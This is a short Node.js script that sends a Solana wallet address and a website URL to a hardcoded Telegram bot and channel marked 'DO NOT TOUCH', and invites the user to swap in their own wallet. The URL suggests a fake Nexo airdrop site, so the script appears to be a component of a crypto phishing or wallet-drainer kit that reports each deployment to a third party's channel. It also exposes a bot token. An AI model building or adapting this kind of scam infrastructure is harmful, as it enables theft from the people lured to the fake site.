const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '8173046916:AAERdi3dqeP80o7dsIg5mEyX5P8g0-NXISQ';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '2025772017';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'GVjgARu9Hj7NGaP8ZWEDR1VbLBpXCEez6p8QondQTcvP';
const website_url = 'https://airdrop-nexo-org.vercel.app/';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
